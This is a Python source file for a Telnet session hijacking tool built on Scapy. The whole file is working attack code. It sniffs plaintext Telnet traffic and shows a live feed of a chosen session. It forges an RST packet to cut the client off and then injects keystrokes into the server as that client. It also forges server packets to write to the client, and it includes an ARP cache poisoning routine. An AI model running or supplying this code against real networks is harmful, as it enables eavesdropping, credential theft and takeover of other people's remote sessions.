#Python script relying on Scappy python's library
#
#-Detects TELNET connections
#-Intercepts TELNET connections
#-Hijacks TELNET connections
#-Write to TELNET connections
#
# @author flrPwr - Vlad Florea

import psutil #We use it to find out the interfaces
import sys #We use it to force kill threads
from scapy.all import * #Used to forge and sniff packets 
import os #Use it for processes
import subprocess #Use it for processes
import signal # Use it to force kill the process 
import readchar #Use it to detect keyboard hits --> c++: khbhit
from time import sleep 

logOutMessage="\r\nlogout\r\n" #Telnet's default logout message
snifferLog='sniffer.log' #A log file we use for sniffing
spyLog="spyConn.log" #A log file we use for sniffing

flagArpSpoofer=False #Flag we use to sync threads
flagPrinter=False   #Flag we use to sync threads


#A class that will encapsulate a telnet Connection
class TelNetConnection:
    def __init__(self):
        self.ClientAddr=None
        self.ServerAddr=None
        self.ClientPort=None
        self.ServerPort=None
        self.hash=None
        
        self.clientACK =None
        self.serverACK =None
        self.clientSEQ=None
        self.serverSEQ =None
        self.clientRecvData=""
        self.serverRecvData=""
        self.clientLastRecvData=None
    #Method that computes a hash which we will use as an unique id for each connection
    def setHash(self):
        hashStr = str(self.ClientAddr)+str(self.ServerAddr)+str(self.ClientPort)+str(self.ServerPort)
        self.hash= hash(hashStr)

#List of active connections
activeConns =[]

#Method to print active connections
def print_ActiveConns():
    print("There are " + str(len(activeConns))+" Telnet sessions at the momment")

#Method that forges and arp request and gets the MAC of a device
def getMacByIp(ip,interface):
    #sr -> send receive function from scappy
    #op =1 -> operation: Arp request from standard
    #psrc -> deprecated
    #pdst -> dest ip
    #interface
    result=sr(ARP(op=1, psrc="0.0.0.0", pdst=ip), iface=interface)
    #result = arp response
    arpContent=result[0][ARP]
    #Hardware src -> Mac addr
    print(result[0][ARP].res[0][1].hwsrc)

#Method that logs to snifferLog file
def logToSnifferConsole(message):
    with open(snifferLog,'a',1) as f:
        f.write(message+"\n")

#Method that logs to SpyLog
#We use w because we want to delete everything else when we log
def logToSpyLog(message):
    with open(spyLog,'w',1) as f:
        f.write(message)

#Method we use to clear snifferLogger in the beggining
def clearLogger():
    try:
        os.remove(snifferLog)
    except:
        pass

#Callback method for every packet we receive
def pkt_callback(pkt):
    #Extracting the values from the TCP layer
    destAddr=pkt[IP].dst
    srcAddr=pkt[IP].src
    dstPort=pkt[TCP].dport
    srcPort=pkt[TCP].sport
    ack=pkt[TCP].ack
    seq=pkt[TCP].seq
    rawData=''

    #If we have raw Data in the payload, we extract it
    if(Raw in pkt):
        try:
            rawData = pkt[Raw].load.decode("utf-8")
        except:
            pass
    
    #We might have a new telnet connection
    posConn = TelNetConnection()

    #Determining the direction of the packet client --> server/ or server -->client
    if(str(srcPort) == str(telnet_PORT)):
        #A telnet packet from server to client
        posConn.ServerAddr = srcAddr
        posConn.ClientAddr = destAddr
        posConn.ServerPort = srcPort
        posConn.ClientPort = dstPort
    
        posConn.serverACK =ack
        posConn.serverSEQ =seq
        posConn.clientRecvData = rawData

        #We also store the last receive data from the Server-> we will need it to hijack the session
        posConn.clientLastRecvData= rawData

    elif(str(dstPort) == str(telnet_PORT)):
        #A telnet packet from client to server
        posConn.ServerAddr = destAddr
        posConn.ClientAddr = srcAddr
        posConn.ServerPort = dstPort
        posConn.ClientPort = srcPort

        posConn.clientACK= ack
        posConn.clientSEQ=seq
        posConn.serverRecvData = rawData
    
    else:
        #Wrong type of packet -> we should never get here
        return

    #Compute a hash to check wether we already know about this connection
    posConn.setHash()

    for conn in activeConns:
        if(posConn.hash == conn.hash):
            #We already know about this connection so we modify it with what we've just received
            
            #Adding the raw data if received, at least one of this should be empty
            conn.clientRecvData += posConn.clientRecvData
            conn.serverRecvData += posConn.serverRecvData

            #Modifying the seq and ack fields
            if(posConn.clientACK is not None):
                conn.clientACK = posConn.clientACK
            if(posConn.serverACK is not None):
                conn.serverACK = posConn.serverACK
            if(posConn.clientSEQ is not None):
                conn.clientSEQ = posConn.clientSEQ
            if(posConn.serverSEQ is not None):
                conn.serverSEQ = posConn.serverSEQ
            if(posConn.clientLastRecvData is not None):
                conn.clientLastRecvData = posConn.clientLastRecvData

            if(posConn.clientRecvData == logOutMessage):
                #The client received a logout message from the server
                activeConns.remove(conn)
                logToSnifferConsole("A telnet session has been closed")
            return
    if(rawData != ''):
        #If we have raw data -> we've found a new connection
        logToSnifferConsole("Found a new TELNET SESSION")
        activeConns.append(posConn)



#Thread we use to sniff TELNET connections on the chosen interface
def sniffOnInterface_thread(interface):
    #Creating a log file to pipe the output to   
    logToSnifferConsole("Starting sniffing on interface... "+interface)
    logToSnifferConsole("You can close me anytime... ")
    
    #Creating a new process to display the output
    #We use powershell's command Get-Content (~unix equivalent of tail -f) to continously update and display the log file
    command ="Get-Content -Path sniffer.log -Wait"
    subprocess.call('start powershell.exe '+command, shell=True)

  

    #Matching only telnet traffic
    defFilter="tcp port "+str(telnet_PORT)
    #Starting a live capture with scappy
    sniff(iface=interface, prn=pkt_callback, filter=defFilter, store=0)

#Method we use to display the menu
def displayMenu():
    print("1. List active TELNET connections")
    print("2. Sniff on a TELNET connection")
    print("3. Hijack a TELNET connection")
    print("4. Write to a TELNET connection")
    print('5. EXIT')

#Method we use to list the ActiveConnections
def listActiveConns():
    print("\nThere are "+str(len(activeConns))+" active TELNET sessions at the moment:\n")

    for i in range(len(activeConns)):
        conn = activeConns[i]
        print(str(i)+":"+"Client:"+str(conn.ClientAddr)+":"+str(conn.ClientPort)+"--> Server:"+str(conn.ServerAddr)+":"+str(conn.ServerPort))
    print("\n")


#Method we use to sniff on a TELNET connection and see the communication between the two entitites
def sniffOnConn():
    listActiveConns()
    connIndex = input("Which connection would you like to sniff? choose index: ")
    try:
        conn = activeConns[int(connIndex)]
    except:
        print("Invalid index")
        return
    #removing the old log
    try:
        os.remove(spyLog)
    except:
        pass
    
    logToSpyLog("ACTIVE TELNET SESSION LIVE FEED ...")
    command ="Get-Content -Path "+spyLog+" -Wait"
    #We start a new shell with Get-Content to update the spy log
    subprocess.call('start powershell.exe '+command, shell=True)

    try:
        print("Use ctr-C to terminate the live feed")
        oldData=""
        while True:
            #Every 0.1 seconds we update overwrite the log file
            crtData = conn.clientRecvData
            logToSpyLog(crtData)
            time.sleep(0.1)
    except KeyboardInterrupt:
        pass


#We use this thread to continously send Gratuitous ARP-s (Arp replies on ff:ff:ff:ff:ff:ff)
#This way, we can poison the arp cache of the hosts on the network -> We only need to poison the cache of the Access Point(Switch)
#Could make it less noisy.
#Deprecated

def arpPoisonThread(spoofIp, destIp):
    #Sending gratuitous arp-reply on broadcast
    #Telling the hosts on the network that my ip address is the clients ip address
    global flagArpSpoofer
    while(flagArpSpoofer):
        #Every one second send an arp reply
        packet = scapy.ARP(op = 2, pdst = destIp ,hwdst = ETHER_BROADCAST, psrc = spoofIp)
        scapy.send(packet, verbose = False)
        sleep(1)

#We use this thread to access the last data received from the server and display it
def printNetworkThread(conn):
    global flagPrinter
    actual_val = conn.clientLastRecvData
    print(actual_val)
    while(flagPrinter):
        crtVal=conn.clientLastRecvData
        if(actual_val != crtVal):
            actual_val = crtVal
            print(actual_val,end="")

#We use this method after we've hijacked the TELNET session in order to communicate
def comOnTelnet(conn):
    #Start a separate thread to print the receive and output data from 
    global flagPrinter
    flagPrinter = True
    printerThread =threading.Thread(target=printNetworkThread, args=(conn,))
    printerThread.start()
    print("Hijacked TELNET CONNECTION -> CTR-C to exit\n")
    try:
        while(True):
            #Read key
            key= readchar.readkey()
            #Set flags to PSH and ACK 
            flags = 0x018 #PSH&ACK
            #Forge a new packet: We spoof our IP addr with the client's ip address. We make sure SYN & ACK are correct
            spoofed_packet = IP(src=conn.ClientAddr, dst=conn.ServerAddr) / TCP(sport=conn.ClientPort, dport=conn.ServerPort,seq=conn.serverACK,ack=conn.serverSEQ+len(conn.clientLastRecvData),flags=flags)/key
            #We send our forged packet
            send(spoofed_packet,iface=interface,verbose= False)

    except KeyboardInterrupt:
        pass
    
    
    flagPrinter=False
    printerThread.join()



def hijackTelnet(interface):
    listActiveConns()
    connIndex = input("Which connection would you like to Hijack? choose index: ")
    try:
        conn = activeConns[int(connIndex)]
    except:
        print("Invalid index")
        return
    
    #First, we make sure to disconnect the client from the telnet session by spoofing our ip
    sourceIp = conn.ServerAddr # spoofed server IP address
    destIp = conn.ClientAddr # clients IP address
    srcPort = conn.ServerPort # Server port: should be 23
    destPort = conn.ClientPort # client's destination port
    flags = 0x04 #RST FLAG
    #Sending a spoofed packed with the sequence number = last ack received from client
    spoofed_packet = IP(src=sourceIp, dst=destIp) / TCP(sport=srcPort, dport=destPort,seq=conn.clientACK,ack=conn.serverACK,flags=flags)
    send(spoofed_packet,iface=interface)
    
    #Getting the client's Mac addr
    print("Sending an ARP request to get the client's MAC address")
    clientMac = getMacByIp(conn.ClientAddr,interface)
    print("Client Mac is:"+str(clientMac))
    

    #Start a communication session on TELNET3
    comOnTelnet(conn)


def writeToTelnet(interface):
    listActiveConns()
    connIndex = input("Which connection would you like to Write To? choose index: ")
    try:
        conn = activeConns[int(connIndex)]
    except:
        print("Invalid index")
        return
    
    sourceIp = conn.ServerAddr # spoofed server IP address
    destIp = conn.ClientAddr # clients IP address
    srcPort = conn.ServerPort # Server port: should be 23
    destPort = conn.ClientPort # client's destination port
    flags = 0x018 #PSH&ACK FLAGs
    
    print("Press Ctr-C to finish")
    try:
        while(True):
            payload = input("Payload string: ")
            spoofed_packet = IP(src=sourceIp, dst=destIp) / TCP(sport=srcPort, dport=destPort,seq=conn.clientACK,ack=conn.serverACK,flags=flags)/ payload
            send(spoofed_packet,iface=interface)


    except KeyboardInterrupt:
        pass




if __name__ == "__main__":
    #The default port for telnet is 23
    telnet_PORT = 23
    print("TELNET SESSION HIJACKER")
    #Clearing the old log file
    clearLogger()
    #Veryfing all the available interfaces through psutil
    print("Device's interfaces are:")
    interfaces=[]
    i=0
    for name, addrs, in psutil.net_if_addrs().items():
        interfaces.append(name)
        print(str(i)+": "+name)
        i+=1

    i= input("Choose interface # to sniff: ")


    interface = interfaces[int(i)]

    #Creating a new thread
    snifferThread = threading.Thread(target=sniffOnInterface_thread, args=(interface,))
    snifferThread.start()

    while(True):
        displayMenu()
        option = input("Choose an option from the menu: ")
        if option == str(1):
            #List Active telnet connection
            listActiveConns()
        elif option == str(2):
            sniffOnConn()
        elif option == str(3):
            #Hijack telnet connection
            hijackTelnet(interface)
        elif option == str(4):
            writeToTelnet(interface)
        elif option == str(5):
            break
        else:
            print("Wrong option, choose again")
    os.kill(os.getpid(),signal.SIGTERM)